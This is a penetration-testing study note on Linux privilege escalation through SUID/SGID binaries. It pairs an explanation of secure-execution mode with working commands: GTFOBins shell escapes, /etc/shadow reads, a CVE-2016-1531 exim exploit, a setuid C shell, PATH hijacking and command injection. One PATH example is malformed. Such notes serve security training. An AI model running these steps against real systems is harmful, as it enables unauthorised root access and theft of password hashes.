---
created: 2025-12-23
tags:
  - Linux_PrivEsc
  - Linux
sticker: lucide//file-key-2
---
## SUID and SGID

Linux normally enforces privileges based on **who starts a process** — the process's Real UID (RUID) and Real GID (RGID). 
**SUID and SGID flip that rule**: the actual privileges — the Effective User ID (EUID) and Effective Group ID (EGID) — are inherited from the **file owner or group**, not the caller.

>[!tip] If you can execute a binary that has more permissions than you do, your job is to find a way to induce behavior that can be exploited for privilege escalation.

- **SUID (Set User ID)**: the `4000` bit
	- When the **SUID bit** is set on an executable file, the process runs with the **privileges of the file owner** (i.e., the Effective User ID, EUID, is set to the file's owner), not the user who actually executes it (the Real User ID, RUID).
	- Displayed as `s` in the file owner's execute permission (e.g., `-rwsr-xr-x`).
	- **Octal Value:** `4` (e.g., `4755`).

>[!important] An SUID binary executes with the privileges of the file's owner, not the user who started it. 

>[!example]+ SUID and `passwd`
>The `passwd` (`/usr/bin/passwd`) executable is a SUID binary owned by root. This means that when a regular user invokes the `passwd` command, **the `passwd` process runs with root privileges** (not with the privileges of the caller user).
> 
> ```bash
> ls -l /usr/bin/passwd
> ```
> 
> ```bash
> -rwsr-xr-x 1 root root 80856 Jun 27 2025 /usr/bin/passwd
> ```
>This is required because to change a user's password, `passwd` must modify `/etc/shadow`, which is writable only by root.

- **SGID (Set Group ID)**: the `2000` bit
	- When the **SGID bit** is set on an **executable file**, the process runs with the **privileges of the group owner of the file** (i.e., Effective Group ID (EGID) is set to the file's group owner).
	- When the **SGID bit** is set on a **directory** (this is more common), new files created in that directory **automatically inherit the directory's group owner** (not the group of the user who created it).
	- Displayed as `s` in the group owner's execute permission (e.g., `-rwxr-sr-x`).
	- **Octal Value:** `2` (e.g., `2755`).

>[!important] An SGID binary executes with the privileges of the file's group owner.

>[!note] SGID binaries are less flashy but far from useless — especially when the group owner can perform privileged operations (`shadow`, `adm`, `docker`, `lxd`, etc.). See [[privileged_groups]].

>[!note] See [[permissions_&_ownership]] to read more about SUID and SGID.

### Environment variables and secure-execution mode

Like commands executed with `sudo`, SUID and SGID binaries run in a restricted environment — but the restriction model is very different from `sudo`. 

- With `sudo`, the environment is aggressively filtered by policy (`sudoers`).
- With SUID/SGID, the restrictions are enforced primarily by the **dynamic loader ([`ld.so`](https://man.archlinux.org/man/ld.so.8.en))**, and sometimes by the program itself.

There is **no central policy engine** like `sudo`. Instead, Linux relies on a concept called **secure execution**.

For security reasons, when the dynamic linker determines that a binary should run in _secure-execution mode_, the effects of certain environment variables are **voided, modified, or stripped entirely**, so that the program does not even see them.

>A process is executed in **secure-execution mode** when the auxiliary vector entry **`AT_SECURE`** has a non-zero value (see [`getauxval — man pages`](https://man.archlinux.org/man/getauxval.3.en)).

This happens in several situations, most importantly:
- The real and effective UIDs of the process differ (**SUID**).
- The real and effective GIDs of the process differ (**SGID**).
- A non-root process executes a binary that grants capabilities to the process.
- A Linux Security Module (LSM), such as SELinux or AppArmor, forces it.

In practice, this means that when you execute a SUID or SGID binary, Linux marks the process with **`AT_SECURE=1`**. Once this flag is set, `ld.so` switches to a defensive mode.

In secure-execution mode, the dynamic loader **disables environment variables that could influence library loading, symbol resolution, or linker behavior** — because those would allow trivial privilege escalation.

Among the variables that are stripped or ignored:

```bash
GCONV_PATH		    LD_PRELOAD
GETCONF_DIR		    LD_PROFILE
HOSTALIASES		    LD_SHOW_AUXV
LOCALDOMAIN		    LOCPATH
LD_AUDIT	    	MALLOC_TRACE
LD_DEBUG    		NIS_PATH
LD_DEBUG_OUTPUT		NLSPATH
LD_DYNAMIC_WEAK		RESOLV_HOST_CONF
LD_HWCAP_MASK		RES_OPTIONS
LD_LIBRARY_PATH		TMPDIR
LD_ORIGIN_PATH  	TZDIR
```

This **does not**:
- Sanitize `PATH`
- Sanitize application-specific variables
- Prevent the program from calling `getenv()`
- Protect against logic bugs

>[!important] Even though library-related variables are stripped, **`PATH` is not sanitized** by the dynamic loader. If a SUID binary executes another program by name (e.g., `system("ls")` instead of `system("/bin/ls")`), you can hijack execution by manipulating `PATH`.
>See [[#SUID binaries vulnerable to `PATH` hijacking]].

| Variable                   | Purpose                              | Secure-execution behavior                     | Attacker relevance                                  |
| -------------------------- | ------------------------------------ | --------------------------------------------- | --------------------------------------------------- |
| `LD_LIBRARY_PATH`          | Extra library search paths           | **Ignored**                                   | Classic injection vector, blocked for SUID          |
| `LD_PRELOAD`               | Preload shared objects before others | **Severely restricted**                       | Only system SUID libs allowed (almost never useful) |
| `LD_AUDIT`                 | Load audit libraries                 | **Ignored**                                   | Debug/auditing only                                 |
| `LD_DEBUG`                 | Dynamic linker debugging             | **Ignored** (unless `/etc/suid-debug` exists) | Useful for analysis, rarely exploitable             |
| `LD_DEBUG_OUTPUT`          | Redirect debug output                | **Ignored**                                   | No escalation value                                 |
| `LD_BIND_NOW`              | Resolve all symbols at startup       | Allowed                                       | Mostly diagnostic                                   |
| `LD_TRACE_LOADED_OBJECTS`  | List dependencies (like `ldd`)       | Allowed                                       | Enumeration only                                    |
| `LD_ASSUME_KERNEL`         | Fake kernel ABI version              | Allowed                                       | Legacy compatibility                                |
| `LD_DYNAMIC_WEAK`          | Change weak symbol resolution        | **Ignored**                                   | Historical behavior                                 |
| `LD_HWCAP_MASK`            | Mask CPU capabilities                | Partially ignored                             | Rarely relevant                                     |
| `LD_ORIGIN_PATH`           | Binary location                      | **Ignored**                                   | Blocks origin-based tricks                          |
| `LD_PROFILE`               | Enable profiling                     | Path altered                                  | No practical privesc use                            |
| `LD_PROFILE_OUTPUT`        | Profiling output directory           | **Forced to `/var/profile`**                  | Prevents file write abuse                           |
| `LD_SHOW_AUXV`             | Print auxiliary vector               | **Ignored**                                   | Information only                                    |
| `LD_POINTER_GUARD`         | Pointer mangling                     | Removed (modern glibc)                        | No longer useful                                    |
| `LD_USE_LOAD_BIAS`         | Control load addresses               | **Ignored**                                   | ASLR safety                                         |
| `LD_PREFER_MAP_32BIT_EXEC` | Map code in low memory               | **Disabled**                                  | ASLR protection                                     |

>[!note] See [`ENVIRONMENT, ld.so — man pages`](https://man.archlinux.org/man/ld.so.8.en#ENVIRONMENT)

This is why library hijacking via `LD_PRELOAD` and `LD_LIBRARY` path usually do not work against SUID binaries. 

This also means that **statically linked binaries run in an unrestricted environment** — since the dynamic loader is not involved at all.

>[!note] See [[shared_library_hijacking]].
## Enumeration

Your goal is to find **binaries that execute with more privileges than you have**.

- Find all **SUID** binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
find / -perm u+s -type f 2>/dev/null 
```

- Find all **SGID** binaries:

```bash
find / -perm -2000 -type f 2>/dev/null
```

```bash
find / -perm g+s -type f 2>/dev/null
```


- Find binaries with **SUID or SGID** bits set:

```bash
find / -type f -a \( -perm u+s -o -perm -g+s \) -ls 2>/dev/null
```

```bash
find / -type f -a \( -perm -2000 -o -perm -4000 \) -ls 2>/dev/null
```

- Find binaries with both **SUID and SGID** set:

```bash
find / -type f -a \( -perm u+s -a -perm -g+s \) -ls 2>/dev/null
```

```bash
find / -perm /6000 -type f 2>/dev/null
```

>[!tip]+ 
> - Ignore standard system binaries like `/usr/bin/passwd` or `/bin/su`.
> - Focus on anomalies: custom paths (`/home/`, `/opt/`, `/usr/local/bin/`), weird names, version numbers in names, etc.
## Exploiting SUID & SGID permissions for privilege escalation

SUID/SGID binaries vulnerable to privilege escalation usually fall in one of the following groups:

- **Known exploitable binaries** (GTFOBins)
- **Writable SUID/SGID binaries**
- **SUID binaries vulnerable to `PATH` hijacking**
- **Custom or non-standard SUID/SGID binaries**

- **SGID binaries exposing sensitive group access**
- **SUID binaries with relative paths**
- **SUID binaries vulnerable to environment variable abuse**

- **SUID binaries vulnerable to library loading abuse**
- **Argument injection vulnerabilities**

Each category has a **different exploitation strategy**.
### Exploiting known SUID binaries (GTFOBins)

Some standard Linux utilities are **dangerous** when SUID bit is set, because they can be abused to achieve shell execution or manipulate files. You can find a comprehensive list of such in [`GTFOBins`](https://gtfobins.github.io/).

To filter the results binaries that are vulnerable to SUID/SGID privilege escalation, click on the `SUID` category or enter the query:

```bash
//^suid$
```

>[!bug] The [`GTFOBins`](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be exploited for privilege escalation.

![[GTFOBins_SUID.png]]

Common examples include:

- [`/bin/bash`](https://gtfobins.github.io/gtfobins/bash/):

```bash
/bin/bash -p
```


>[!important]+ The `-p` flag
>- By default, Bash **resets its effective UID** (the actual privileges it's running with at a given moment) to its **real UID** (privileges of the user who launched it), rather than continuing to run with **SUID privileges** (privileges of the file owner).
>- The `-p` flag tells Bash to **preserve its effective UID**. 
>
>Without `-p`, you will get a non-privileged shell even if `/bin/bash` is a SUID binary.

- [`find`](https://gtfobins.github.io/gtfobins/find/):

```bash
find . -exec /bin/sh \; -quit
```

- [`vim`](https://gtfobins.github.io/gtfobins/vim/#suid) (requires `vim` to be compiled with Python support):

```bash
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

- [`docker`](https://gtfobins.github.io/gtfobins/docker/):

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- [`apt-get`](https://gtfobins.github.io/gtfobins/apt-get/) (invokes the default pager, likely `less`, which you can then escape from to get a shell):

```bash
apt-get changelog apt
!/bin/sh
```

>[!tip]+
> If you can't escalate privileges directly and get a root shell, look for opportunities to read protected files and search further. 
> - For example, while `base64` with SUID won't give you root immediately, it can be used to [read sensitive files](https://gtfobins.github.io/gtfobins/base64/#file-read) like `/etc/shadow`:
> 
> ```bash
> export F=/etc/shadow; base64 "$F" | base64 --decode
> ```
> You may then be able to crack password hashes and get access. 

#### Indirect privilege escalation: file read or write capabilities

Not every SUID binary gives you a direct shell. Some provide **file read or write capabilities** that can be leveraged for further exploitation.
**If you can't escalate privileges directly and get a root shell, look for opportunities to read or write protected files and search further.**

>[!example]+
> `base64` with SUID won't give you root immediately, but it can be used to [read sensitive files](https://gtfobins.github.io/gtfobins/base64/#file-read) like `/etc/shadow`:
> 
> ```bash
> export LFILE=/etc/shadow
> base64 "$LFILE" | base64 --decode
> ```
> 
> Once you extract password hashes, you can try to crack them offline with `john` or `hashcat`.
> 

- SUID/SGID binaries that can be used to read protected files:
	- [`xxd`](https://gtfobins.org/gtfobins/xxd/#file-read)
	- [`xz`](https://gtfobins.org/gtfobins/xz/#file-read)
	- [`ss`](https://gtfobins.org/gtfobins/ss/#file-read)
	- [`sort`](https://gtfobins.org/gtfobins/sort/#file-read)

- SUID/SGID binaries that can be used to write protected files:
	- [`sort`](https://gtfobins.org/gtfobins/sort/#file-write)
	- [`cp`](https://gtfobins.org/gtfobins/cp/#file-write)
	- [`shred`](https://gtfobins.org/gtfobins/shred/#file-write)


>[!example]+
> - Writing arbitrary files with `xxd`:
> 
> ```bash
> echo DATA | xxd | xxd -r - /path/to/output-file
> ```
> 
> - Reading files with `xxd`:
> 
> ```bash
> xxd /path/to/input-file | xxd -r
> ```


#### When GTFOBins isn't enough

Sometimes you'll encounter SUID/SGID executables for lesser-known programs not listed in GTFOBins. Don't give up:
- Search the binary name along with terms like "privilege escalation" or "exploit"
- Check ExploitDB for known CVEs
- Read the program's documentation and look for features that execute commands or read/write files.


>[!example]+ Example: Known exploit in ExploitDB
> - You enumerate SUID files:
> 
> ```bash
> find / -perm -4000 -type f 2>/dev/null  
> ```
> 
> ```bash
> /usr/bin/chsh  
> /usr/bin/sudo  
> /usr/bin/newgrp  
> /usr/bin/sudoedit  
> /usr/bin/passwd  
> /usr/bin/gpasswd  
> /usr/bin/chfn  
> /usr/local/bin/suid-so  
> /usr/local/bin/suid-env  
> /usr/local/bin/suid-env2  
> /usr/sbin/exim-4.84-3  
> /usr/lib/eject/dmcrypt-get-device  
> /usr/lib/openssh/ssh-keysign  
> /usr/lib/pt_chown  
> /bin/bash  
> /bin/ping6  
> /bin/ping  
> /bin/mount  
> /bin/su  
> /bin/umount  
> /sbin/mount.nfs
> ```
> 
> - `/usr/sbin/exim-4.84-3` stands out. You search for an exploit:
> 
> ```
> exim-4.84-3 cve
> ```
> 
> - This leads to [`CVE-2016-1531`](https://nvd.nist.gov/vuln/detail/CVE-2016-1531) with a [known exploit in ExploitDB](https://www.exploit-db.com/exploits/39535):
> 
> ```bash
> cat > /tmp/root.pm << EOF
> package root;
> use strict;
> use warnings;
> 
> system("/bin/sh");
> EOF
> PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
> ```
> 
> - Execute it and gain root:
> 
> ```bash
> bash ./exploit.sh
> ```
> 
> ```bash
> sh-4.1# whoami  
> root  
> sh-4.1#
> ```

### Writable SUID/SGID binaries

If a SUID/SGID binary is **writable by your user**, you can modify or replace it entirely. When the modified binary executes, your code runs with the elevated privileges of the file owner.

- Find writable SUID/SGID binaries:

```bash
find / -type f -perm -4000 -writable 2>/dev/null
```
 
```bash
find / -type f -perm -2000 -writable 2>/dev/null
```

- Script replacement:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > script.sh
```

- C binary replacement:

```C
#include <stdio.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc -o /path/to/writable-suid-binary exploit.c
/path/to/writable-suid-binary
```

### SUID binaries vulnerable to `PATH` hijacking

SUID binaries may call external programs, especially custom ones. If those calls use **relative paths** rather than absolute, the kernel searches for an executable with that name in the directories specified in the `PATH` environment variable. Since `PATH` is not sanitized by `ld.so`, you control it, and **`PATH` hijacking becomes possible**.

- Use [`strings`](https://man.archlinux.org/man/strings.1.en) to extract readable strings from the binary:

```bash
strings /path/to/binary
```

- Use [`ltrace`](https://man.archlinux.org/man/ltrace.1) to trace library calls:

```bash
ltrace /path/to/suid-binary 2>&1 | grep system
```

- [`strace`](https://man.archlinux.org/man/strace.1) to trace system calls:

```bash
strace -f -e execve /path/to/suid-binary 2>&1 | grep execve
```

- Look for:
	- Command names without paths (e.g., `ls`, `cat`, `id`, `whoami`)
	- Partial paths (e.g., `bin/ls`, missing leading `/`)
	- References of environment variables

- If you found a command name without a path, create a binary with the same name in the directory you can write into (e.g., `/tmp`):

```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
```

- Then execute the vulnerable SUID binary exporting the path with the directory you control:

```bash
export PATH=/tmp:$PATH /path/to/suid-binary
```

>[!note] See [[PATH_hijacking]] to learn more about `PATH` hijacking.  

>[!tip]+
>If not `PATH`, then look for references of custom environment variables. You can hijack them, too:
>```bash
>strings /path/to/suid-binary | grep -i config
>```
>```bash
>strings /path/to/suid-binary | grep -i env
>```

### Argument injection

If a SUID binary passes user-controlled input directly to a shell command, you can inject arguments or commands.

Look for binaries that:
- Accept user input via arguments or `stdin`
- Pass that input to `system()`, `popen()`, or `exec*()`

- Use [`ltrace`](https://man.archlinux.org/man/ltrace.1) to trace library calls:

```bash
ltrace /path/to/suid-binary 2>&1 | grep system
```

>[!example]+
> A SUID binary that pings hosts:
> 
> ```bash
> ./suid-ping 127.0.0.1
> ```
> 
> If the binary calls `system("ping -c 1 127.0.0.1")`, you can inject:
> 
> ```bash
> ./suid-ping "127.0.0.1; /bin/bash -p"
> ```
> 
> The command becomes:
> 
> ```bash
> system("ping -c 1 127.0.0.1; /bin/bash -p")
> ```
> 
> And you get a root shell.

## Checklist

- [ ] Enumerate all SUID binaries (`find / -perm -4000 -type f 2>/dev/null`)
- [ ] Enumerate all SGID binaries (`find / -perm -2000 -type f 2>/dev/null`)
- [ ] Identify unusual or custom binaries (non-standard paths, version numbers)
- [ ] Check [`GTFOBins`](https://gtfobins.github.io/) for known exploitable binaries
- [ ] Run `strings` on custom binaries to find external command calls
- [ ] Check for writable SUID/SGID binaries
- [ ] Run `ldd` to check library dependencies
- [ ] Test for `PATH` hijacking (commands without absolute paths)
- [ ] Test for argument injection (pass controlled input)
- [ ] Check for shell escape sequences (interactive programs)
- [ ] Check SGID group permissions for privileged group access
- [ ] Run `ltrace` and `strace` to observe runtime behavior (if time permits)

## References and further reading

- [`Linux Privilege Escalation using SUID Binaries — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- [`SUID/SGID binaries — The Hacker Recipes`](https://www.thehacker.recipes/infra/privilege-escalation/unix/suid-sgid-binaries)
- [`execve — man pages`](https://man.archlinux.org/man/execve.2.en)

- [`ENVIRONMENT, ld.so — man pages`](https://man.archlinux.org/man/ld.so.8.en#ENVIRONMENT)
- [`getauxval — man pages`](https://man.archlinux.org/man/getauxval.3.en)

